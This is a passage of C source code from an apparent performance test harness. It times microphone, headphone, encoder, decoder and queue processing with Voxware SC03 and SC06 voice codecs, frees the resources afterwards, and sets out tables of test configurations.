        WaitForSingleObject(hMicrophoneEvent[0][dwPacket], INFINITE);

        for (dwObject = 1; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
            CopyMemory(pMicrophonePacket[dwObject][dwPacket].pvBuffer, pMicrophonePacket[0][dwPacket].pvBuffer, pMicrophonePacket[dwObject][dwPacket].dwMaxSize);
        }
    }

    // Seed the encoder packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        pEncoderObject[0]->Process(&pMicrophonePacket[0][dwPacket], &pEncoderPacket[0][dwPacket]);

        for (dwObject = 1; dwObject < (sizeof(pEncoderObject) / sizeof(pEncoderObject[0])); dwObject++) {
            CopyMemory(pEncoderPacket[dwObject][dwPacket].pvBuffer, pEncoderPacket[0][dwPacket].pvBuffer, pEncoderPacket[dwObject][dwPacket].dwMaxSize);
        }
    }

    // Seed the headphone packets
    for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
        for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
            CopyMemory(pHeadphonePacket[dwObject][dwPacket].pvBuffer, pMicrophonePacket[0][dwPacket].pvBuffer, pHeadphonePacket[dwObject][dwPacket].dwMaxSize);
        }
    }



    // Query the CPU times
    GetCpuTimes(&KernelTimeInitial, &InterruptTimeInitial, &DpcTimeInitial, &IdleTimeInitial);



    // Microphone
    if (0 != dwNumMicrophones) {
        // Submit the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumMicrophones; dwObject++) {
                pMicrophoneObject[dwObject]->Process(NULL, &pMicrophonePacket[dwObject][dwPacket]);
            }
        }

        // Wait for the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumMicrophones; dwObject++) {
                WaitForSingleObject(hMicrophoneEvent[dwObject][dwPacket], INFINITE);
            }
        }
    }

    // Encoder
    if (0 != dwNumEncoder) {
        // Submit the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumEncoder; dwObject++) {
                pEncoderObject[dwObject]->Process(&pMicrophonePacket[dwObject % (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0]))][dwPacket], &pEncoderPacket[dwObject][dwPacket]);
            }
        }
    }

    // Decoder
    if (0 != dwNumDecoder) {
        // Submit the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumDecoder; dwObject++) {
                pDecoderObject[dwObject]->Process(&pEncoderPacket[dwObject % (sizeof(pEncoderObject) / sizeof(pEncoderObject[0]))][dwPacket], &pDecoderPacket[dwObject][dwPacket]);
            }

            // Mix the packets
            if (TRUE == bMix) {
                wNumMixPackets = 0;
                ZeroMemory(fMixBuffer, sizeof(FLOAT) * VOICE_BYTES_PER_MS * wMsOfDataPerPacket / sizeof(SHORT));

                for (dwObject = 0; dwObject < dwNumDecoder; dwObject++) {
                    wNumMixPackets++;

                    for (wValue = 0; wValue < (pDecoderPacket[dwObject][dwPacket].dwMaxSize / sizeof(SHORT)); wValue++) {
                        fMixBuffer[wValue] += (FLOAT) ((SHORT *) pDecoderPacket[dwObject][dwPacket].pvBuffer)[wValue];
                    }
                }

                for (wValue = 0; wValue < (pMixPacket[dwPacket].dwMaxSize / sizeof(SHORT)); wValue++) {
                    ((SHORT *) pMixPacket[dwPacket].pvBuffer)[wValue] = (SHORT) (fMixBuffer[wValue] / wNumMixPackets);
                }
            }
        }
    }

    // Queue
    if (0 != dwNumQueue) {
        // Submit the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumQueue; dwObject++) {
                pQueueObject[dwObject]->Process(&pEncoderPacket[dwObject % (sizeof(pEncoderObject) / sizeof(pEncoderObject[0]))][dwPacket], NULL);
            }
        }

        // Wait for the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumQueue; dwObject++) {
                do {
                    hResult = pQueueObject[dwObject]->Process(NULL, &pQueuePacket[dwObject][dwPacket]);

                    if (FAILED(hResult)) {
                        Sleep(wMsOfDataPerPacket);
                    }
                } while (FAILED(hResult));
            }

            // Mix the packets
            if (TRUE == bMix) {
                wNumMixPackets = 0;
                ZeroMemory(fMixBuffer, sizeof(FLOAT) * VOICE_BYTES_PER_MS * wMsOfDataPerPacket / sizeof(SHORT));

                for (dwObject = 0; dwObject < dwNumQueue; dwObject++) {
                    pQueueObject[dwObject]->GetLastOutputInfo(&pQueuePacketInfo[dwObject][dwPacket]);

                    if (0 < pQueuePacketInfo[dwObject][dwPacket].nMaxPower) {
                        wNumMixPackets++;

                        for (wValue = 0; wValue < (pQueuePacket[dwObject][dwPacket].dwMaxSize / sizeof(SHORT)); wValue++) {
                            fMixBuffer[wValue] += (FLOAT) ((SHORT *) pQueuePacket[dwObject][dwPacket].pvBuffer)[wValue];
                        }
                    }
                }

                for (wValue = 0; wValue < (pMixPacket[dwPacket].dwMaxSize / sizeof(SHORT)); wValue++) {
                    ((SHORT *) pMixPacket[dwPacket].pvBuffer)[wValue] = (SHORT) (fMixBuffer[wValue] / wNumMixPackets);
                }
            }
        }
    }

    // Headphone
    if (0 != dwNumHeadphones) {
        // Submit the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumHeadphones; dwObject++) {
                pHeadphoneObject[dwObject]->Process(&pHeadphonePacket[dwObject][dwPacket], NULL);
            }
        }

        // Wait for the packets
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            for (dwObject = 0; dwObject < dwNumHeadphones; dwObject++) {
                // Wait for a packet
                WaitForSingleObject(hHeadphoneEvent[dwObject][dwPacket], INFINITE);
            }
        }
    }



    // Query the CPU times
    GetCpuTimes(&KernelTimeFinal, &InterruptTimeFinal, &DpcTimeFinal, &IdleTimeFinal);

ExitTest:
    // Free the devices and objects

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        if (NULL != pMicrophoneObject[dwObject]) {
            dwTotalMicrophoneFailures += dwMicrophoneAttempts[dwObject] - 1;
            *dwNumMicrophoneFailures += dwMicrophoneAttempts[dwObject] - 1;

            // Close the device
            pMicrophoneObject[dwObject]->Release();
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        if (NULL != pHeadphoneObject[dwObject]) {
            dwTotalHeadphoneFailures += dwHeadphoneAttempts[dwObject] - 1;
            *dwNumHeadphoneFailures += dwHeadphoneAttempts[dwObject] - 1;

            // Close the device
            pHeadphoneObject[dwObject]->Release();
        }
    }

    // Encoder
    for (dwObject = 0; dwObject < (sizeof(pEncoderObject) / sizeof(pEncoderObject[0])); dwObject++) {
        if (NULL != pEncoderObject[dwObject]) {
            dwTotalEncoderFailures += dwEncoderAttempts[dwObject] - 1;
            *dwNumEncoderFailures += dwEncoderAttempts[dwObject] - 1;

            // Close the device
            pEncoderObject[dwObject]->Release();
        }
    }

    // Decoder
    for (dwObject = 0; dwObject < (sizeof(pDecoderObject) / sizeof(pDecoderObject[0])); dwObject++) {
        if (NULL != pDecoderObject[dwObject]) {
            dwTotalDecoderFailures += dwDecoderAttempts[dwObject] - 1;
            *dwNumDecoderFailures += dwDecoderAttempts[dwObject] - 1;

            // Close the device
            pDecoderObject[dwObject]->Release();
        }
    }

    // Queue
    for (dwObject = 0; dwObject < (sizeof(pQueueObject) / sizeof(pQueueObject[0])); dwObject++) {
        if (NULL != pQueueObject[dwObject]) {
            dwTotalQueueFailures += dwQueueAttempts[dwObject] - 1;
            *dwNumQueueFailures += dwQueueAttempts[dwObject] - 1;

            // Close the device
            pQueueObject[dwObject]->Release();
        }
    }



    // Free the events

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            if ((NULL != hMicrophoneEvent[dwObject]) && (NULL != hMicrophoneEvent[dwObject][dwPacket])) {
                CloseHandle(hMicrophoneEvent[dwObject][dwPacket]);
            }
        }

        if (NULL != hMicrophoneEvent[dwObject]) {
            xMemFree(hMemObject, hMicrophoneEvent[dwObject]);
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        for (dwPacket = 0; dwPacket < wNumPackets; dwPacket++) {
            if ((NULL != hHeadphoneEvent[dwObject]) && (NULL != hHeadphoneEvent[dwObject][dwPacket])) {
                CloseHandle(hHeadphoneEvent[dwObject][dwPacket]);
            }
        }

        if (NULL != hHeadphoneEvent[dwObject]) {
            xMemFree(hMemObject, hHeadphoneEvent[dwObject]);
        }
    }



    // Free the packets

    // Microphone
    for (dwObject = 0; dwObject < (sizeof(pMicrophoneObject) / sizeof(pMicrophoneObject[0])); dwObject++) {
        if (NULL != pMicrophonePacket[dwObject]) {
            xMemFree(hMemObject, pMicrophonePacket[dwObject]);
        }
    }

    // Headphone
    for (dwObject = 0; dwObject < (sizeof(pHeadphoneObject) / sizeof(pHeadphoneObject[0])); dwObject++) {
        if (NULL != pHeadphonePacket[dwObject]) {
            xMemFree(hMemObject, pHeadphonePacket[dwObject]);
        }
    }

    // Encoder
    for (dwObject = 0; dwObject < (sizeof(pEncoderObject) / sizeof(pEncoderObject[0])); dwObject++) {
        if (NULL != pEncoderPacket[dwObject]) {
            xMemFree(hMemObject, pEncoderPacket[dwObject]);
        }
    }

    // Decoder
    for (dwObject = 0; dwObject < (sizeof(pDecoderObject) / sizeof(pDecoderObject[0])); dwObject++) {
        if (NULL != pDecoderPacket[dwObject]) {
            xMemFree(hMemObject, pDecoderPacket[dwObject]);
        }
    }

    // Queue
    for (dwObject = 0; dwObject < (sizeof(pQueueObject) / sizeof(pQueueObject[0])); dwObject++) {
        if (NULL != pQueuePacket[dwObject]) {
            xMemFree(hMemObject, pQueuePacket[dwObject]);
            xMemFree(hMemObject, pQueuePacketInfo[dwObject]);
        }
    }

    // Mixing packet
    if (NULL != pMixPacket){
        xMemFree(hMemObject, pMixPacket);
    }

    // Mixing buffer
    if (NULL != fMixBuffer) {
        xMemFree(hMemObject, fMixBuffer);
    }



    if (TRUE == bPassed) {
        // Log the stats
        LogStats(hLog, lpszTestName, dwTestIteration, KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, &dwTotalMicrophoneFailures, &dwTotalHeadphoneFailures, &dwTotalEncoderFailures, &dwTotalDecoderFailures, &dwTotalQueueFailures);
        CalculateAndAddStatsDiff(KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, KernelTimeDiff, InterruptTimeDiff, DpcTimeDiff, IdleTimeDiff);
    }

    return (TRUE == bPassed);
}



typedef BOOL (*PDEVICE_CREATE_FUNCTION) (
    IN     HANDLE  hLog,
    IN     LPSTR   lpszTestName,
    IN     DWORD   dwTestIteration,
    IN OUT ULONG   *KernelTimeDiff,
    IN OUT ULONG   *InterruptTimeDiff,
    IN OUT ULONG   *DpcTimeDiff,
    IN OUT ULONG   *IdleTimeDiff,
    IN OUT DWORD   *dwNumMicrophoneFailures,
    IN OUT DWORD   *dwNumHeadphoneFailures,
    IN     DWORD   dwNumMicrophones,
    IN     DWORD   dwNumHeadphones
);

typedef struct _DEVICE_CREATE_FUNCTION_TABLE {
    PDEVICE_CREATE_FUNCTION  pFunction;
    LPSTR                    lpszTestName;
    DWORD                    dwNumMicrophones;
    DWORD                    dwNumHeadphones;
} DEVICE_CREATE_FUNCTION_TABLE, *PDEVICE_CREATE_FUNCTION_TABLE;

static DEVICE_CREATE_FUNCTION_TABLE DeviceCreateFunctionTable[] = {
    { DeviceCreate, "Device Create, Microphone, 1",             1, 0 },
    { DeviceCreate, "Device Create, Microphone, 4",             4, 0 },
    { DeviceCreate, "Device Create, Headphone, 1",              0, 1 },
    { DeviceCreate, "Device Create, Headphone, 4",              0, 4 },
    { DeviceCreate, "Device Create, Microphone & Headphone, 1", 1, 1 },
    { DeviceCreate, "Device Create, Microphone & Headphone, 4", 4, 4 }
};

#define DeviceCreateFunctionTableCount (sizeof(DeviceCreateFunctionTable) / sizeof(DEVICE_CREATE_FUNCTION_TABLE))



typedef BOOL (*PCODEC_CREATE_FUNCTION) (
    IN     HANDLE  hLog,
    IN     LPSTR   lpszTestName,
    IN     DWORD   dwTestIteration,
    IN OUT ULONG   *KernelTimeDiff,
    IN OUT ULONG   *InterruptTimeDiff,
    IN OUT ULONG   *DpcTimeDiff,
    IN OUT ULONG   *IdleTimeDiff,
    IN OUT DWORD   *dwNumEncoderFailures,
    IN OUT DWORD   *dwNumDecoderFailures,
    IN OUT DWORD   *dwNumQueueFailures,
    IN     DWORD   dwNumEncoder,
    IN     DWORD   dwNumDecoder,
    IN     DWORD   dwNumQueue,
    IN     DWORD   dwCodecTag,
    IN     WORD    wMsOfDataPerPacket
);

typedef struct _CODEC_CREATE_FUNCTION_TABLE {
    PCODEC_CREATE_FUNCTION  pFunction;
    LPSTR                   lpszTestName;
    DWORD                   dwNumEncoder;
    DWORD                   dwNumDecoder;
    DWORD                   dwNumQueue;
    DWORD                   dwCodecTag;
    WORD                    wMsOfDataPerPacket;
} CODEC_CREATE_FUNCTION_TABLE, *PCODEC_CREATE_FUNCTION_TABLE;

static CODEC_CREATE_FUNCTION_TABLE CodecCreateFunctionTable[] = {
    { CodecCreate, "Codec Create, Encoder, Voxware SC03, 1",                1, 0,  0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Encoder, Voxware SC03, 4",                4, 0,  0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Decoder, Voxware SC03, 1",                0, 1,  0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Decoder, Voxware SC03, 4",                0, 4,  0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Decoder, Voxware SC03, 12",               0, 12, 0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Queue 20ms, Voxware SC03, 1",             0, 0,  1,  WAVE_FORMAT_VOXWARE_SC03, 20  },
    { CodecCreate, "Codec Create, Queue 20ms, Voxware SC03, 4",             0, 0,  4,  WAVE_FORMAT_VOXWARE_SC03, 20  },
    { CodecCreate, "Codec Create, Queue 20ms, Voxware SC03, 12",            0, 0,  12, WAVE_FORMAT_VOXWARE_SC03, 20  },
    { CodecCreate, "Codec Create, Queue 40ms, Voxware SC03, 1",             0, 0,  1,  WAVE_FORMAT_VOXWARE_SC03, 40  },
    { CodecCreate, "Codec Create, Queue 40ms, Voxware SC03, 4",             0, 0,  4,  WAVE_FORMAT_VOXWARE_SC03, 40  },
    { CodecCreate, "Codec Create, Queue 40ms, Voxware SC03, 12",            0, 0,  12, WAVE_FORMAT_VOXWARE_SC03, 40  },
    { CodecCreate, "Codec Create, Queue 100ms, Voxware SC03, 1",            0, 0,  1,  WAVE_FORMAT_VOXWARE_SC03, 100 },
    { CodecCreate, "Codec Create, Queue 100ms, Voxware SC03, 4",            0, 0,  4,  WAVE_FORMAT_VOXWARE_SC03, 100 },
    { CodecCreate, "Codec Create, Queue 100ms, Voxware SC03, 12",           0, 0,  12, WAVE_FORMAT_VOXWARE_SC03, 100 },
    { CodecCreate, "Codec Create, Encoder & Decoder, Voxware SC03, 1",      1, 1,  0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Encoder & Decoder, Voxware SC03, 4",      4, 4,  0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Encoder & Decoder, Voxware SC03, 12",     4, 12, 0,  WAVE_FORMAT_VOXWARE_SC03, 0   },
    { CodecCreate, "Codec Create, Encoder & Queue 20ms, Voxware SC03, 1",   1, 0,  1,  WAVE_FORMAT_VOXWARE_SC03, 20  },
    { CodecCreate, "Codec Create, Encoder & Queue 20ms, Voxware SC03, 4",   4, 0,  4,  WAVE_FORMAT_VOXWARE_SC03, 20  },
    { CodecCreate, "Codec Create, Encoder & Queue 20ms, Voxware SC03, 12",  4, 0,  12, WAVE_FORMAT_VOXWARE_SC03, 20  },
    { CodecCreate, "Codec Create, Encoder & Queue 40ms, Voxware SC03, 1",   1, 0,  1,  WAVE_FORMAT_VOXWARE_SC03, 40  },
    { CodecCreate, "Codec Create, Encoder & Queue 40ms, Voxware SC03, 4",   4, 0,  4,  WAVE_FORMAT_VOXWARE_SC03, 40  },
    { CodecCreate, "Codec Create, Encoder & Queue 40ms, Voxware SC03, 12",  4, 0,  12, WAVE_FORMAT_VOXWARE_SC03, 40  },
    { CodecCreate, "Codec Create, Encoder & Queue 100ms, Voxware SC03, 1",  1, 0,  1,  WAVE_FORMAT_VOXWARE_SC03, 100 },
    { CodecCreate, "Codec Create, Encoder & Queue 100ms, Voxware SC03, 4",  4, 0,  4,  WAVE_FORMAT_VOXWARE_SC03, 100 },
    { CodecCreate, "Codec Create, Encoder & Queue 100ms, Voxware SC03, 12", 4, 0,  12, WAVE_FORMAT_VOXWARE_SC03, 100 },
    { CodecCreate, "Codec Create, Encoder, Voxware SC06, 1",                1, 0,  0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Encoder, Voxware SC06, 4",                4, 0,  0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Decoder, Voxware SC06, 1",                0, 1,  0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Decoder, Voxware SC06, 4",                0, 4,  0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Decoder, Voxware SC06, 12",               0, 12, 0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Queue 20ms, Voxware SC06, 1",             0, 0,  1,  WAVE_FORMAT_VOXWARE_SC06, 20  },
    { CodecCreate, "Codec Create, Queue 20ms, Voxware SC06, 4",             0, 0,  4,  WAVE_FORMAT_VOXWARE_SC06, 20  },
    { CodecCreate, "Codec Create, Queue 20ms, Voxware SC06, 12",            0, 0,  12, WAVE_FORMAT_VOXWARE_SC06, 20  },
    { CodecCreate, "Codec Create, Queue 40ms, Voxware SC06, 1",             0, 0,  1,  WAVE_FORMAT_VOXWARE_SC06, 40  },
    { CodecCreate, "Codec Create, Queue 40ms, Voxware SC06, 4",             0, 0,  4,  WAVE_FORMAT_VOXWARE_SC06, 40  },
    { CodecCreate, "Codec Create, Queue 40ms, Voxware SC06, 12",            0, 0,  12, WAVE_FORMAT_VOXWARE_SC06, 40  },
    { CodecCreate, "Codec Create, Queue 100ms, Voxware SC06, 1",            0, 0,  1,  WAVE_FORMAT_VOXWARE_SC06, 100 },
    { CodecCreate, "Codec Create, Queue 100ms, Voxware SC06, 4",            0, 0,  4,  WAVE_FORMAT_VOXWARE_SC06, 100 },
    { CodecCreate, "Codec Create, Queue 100ms, Voxware SC06, 12",           0, 0,  12, WAVE_FORMAT_VOXWARE_SC06, 100 },
    { CodecCreate, "Codec Create, Encoder & Decoder, Voxware SC06, 1",      1, 1,  0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Encoder & Decoder, Voxware SC06, 4",      4, 4,  0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Encoder & Decoder, Voxware SC06, 12",     4, 12, 0,  WAVE_FORMAT_VOXWARE_SC06, 0   },
    { CodecCreate, "Codec Create, Encoder & Queue 20ms, Voxware SC06, 1",   1, 0,  1,  WAVE_FORMAT_VOXWARE_SC06, 20  },
    { CodecCreate, "Codec Create, Encoder & Queue 20ms, Voxware SC06, 4",   4, 0,  4,  WAVE_FORMAT_VOXWARE_SC06, 20  },
    { CodecCreate, "Codec Create, Encoder & Queue 20ms, Voxware SC06, 12",  4, 0,  12, WAVE_FORMAT_VOXWARE_SC06, 20  },
    { CodecCreate, "Codec Create, Encoder & Queue 40ms, Voxware SC06, 1",   1, 0,  1,  WAVE_FORMAT_VOXWARE_SC06, 40  },
    { CodecCreate, "Codec Create, Encoder & Queue 40ms, Voxware SC06, 4",   4, 0,  4,  WAVE_FORMAT_VOXWARE_SC06, 40  },
    { CodecCreate, "Codec Create, Encoder & Queue 40ms, Voxware SC06, 12",  4, 0,  12, WAVE_FORMAT_VOXWARE_SC06, 40  },
    { CodecCreate, "Codec Create, Encoder & Queue 100ms, Voxware SC06, 1",  1, 0,  1,  WAVE_FORMAT_VOXWARE_SC06, 100 },
    { CodecCreate, "Codec Create, Encoder & Queue 100ms, Voxware SC06, 4",  4, 0,  4,  WAVE_FORMAT_VOXWARE_SC06, 100 },
    { CodecCreate, "Codec Create, Encoder & Queue 100ms, Voxware SC06, 12", 4, 0,  12, WAVE_FORMAT_VOXWARE_SC06, 100 }
};

#define CodecCreateFunctionTableCount (sizeof(CodecCreateFunctionTable) / sizeof(CODEC_CREATE_FUNCTION_TABLE))



typedef BOOL (*PMEDIA_PROCESS_FUNCTION) (
    IN     HANDLE  hLog,
    IN     HANDLE  hMemObject,
    IN     LPSTR   lpszTestName,
    IN     DWORD   dwTestIteration,
    IN OUT ULONG   *KernelTimeDiff,
    IN OUT ULONG   *InterruptTimeDiff,
    IN OUT ULONG   *DpcTimeDiff,
    IN OUT ULONG   *IdleTimeDiff,
    IN OUT DWORD   *dwNumMicrophoneFailures,
    IN OUT DWORD   *dwNumHeadphoneFailures,
    IN OUT DWORD   *dwNumEncoderFailures,
    IN OUT DWORD   *dwNumDecoderFailures,
    IN OUT DWORD   *dwNumQueueFailures,
    IN     DWORD   dwNumMicrophones,
    IN     DWORD   dwNumHeadphones,
    IN     DWORD   dwNumEncoder,
    IN     DWORD   dwNumDecoder,
    IN     DWORD   dwNumQueue,
    IN     BOOL    bMix,
    IN     DWORD   dwCodecTag,
    IN     WORD    wNumPackets,
    IN     WORD    wMsOfDataPerPacket
);

typedef struct _MEDIA_PROCESS_FUNCTION_TABLE {
    PMEDIA_PROCESS_FUNCTION  pFunction;
    LPSTR                    lpszTestName;
    DWORD                    dwNumMicrophones;
    DWORD                    dwNumHeadphones;
    DWORD                    dwNumEncoder;
    DWORD                    dwNumDecoder;
    DWORD                    dwNumQueue;
    BOOL                     bMix;
    DWORD                    dwCodecTag;
    WORD                     wNumPackets;
    WORD                     wMsOfDataPerPacket;
} MEDIA_PROCESS_FUNCTION_TABLE, *PMEDIA_PROCESS_FUNCTION_TABLE;

static MEDIA_PROCESS_FUNCTION_TABLE MediaProcessFunctionTable[] = {
    { MediaProcess, "Process, Microphone, 10 Buffers, 20ms, Voxware SC03, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Headphone, 10 Buffers, 20ms, Voxware SC03, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Encoder, 10 Buffers, 20ms, Voxware SC03, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Decoder, 10 Buffers, 20ms, Voxware SC03, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Queue, 10 Buffers, 20ms, Voxware SC03, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 20ms, Voxware SC03, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 20ms, Voxware SC03, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Microphone, 10 Buffers, 20ms, Voxware SC03, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Headphone, 10 Buffers, 20ms, Voxware SC03, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Encoder, 10 Buffers, 20ms, Voxware SC03, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Decoder, 10 Buffers, 20ms, Voxware SC03, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 20ms, Voxware SC03, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Queue, 10 Buffers, 20ms, Voxware SC03, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 20ms, Voxware SC03, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 20ms, Voxware SC03, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 20ms, Voxware SC03, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 20ms, Voxware SC03, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 20ms, Voxware SC03, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Decoder, 10 Buffers, 20ms, Voxware SC03, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 20ms, Voxware SC03, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Queue, 10 Buffers, 20ms, Voxware SC03, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 20ms, Voxware SC03, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 20ms, Voxware SC03, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 20ms, Voxware SC03, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 20ms, Voxware SC03, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 20ms, Voxware SC03, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  20  },
    { MediaProcess, "Process, Microphone, 50 Buffers, 20ms, Voxware SC03, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Headphone, 50 Buffers, 20ms, Voxware SC03, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Encoder, 50 Buffers, 20ms, Voxware SC03, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Decoder, 50 Buffers, 20ms, Voxware SC03, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Queue, 50 Buffers, 20ms, Voxware SC03, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Decoder), 50 Buffers, 20ms, Voxware SC03, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Queue), 50 Buffers, 20ms, Voxware SC03, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Microphone, 50 Buffers, 20ms, Voxware SC03, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Headphone, 50 Buffers, 20ms, Voxware SC03, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
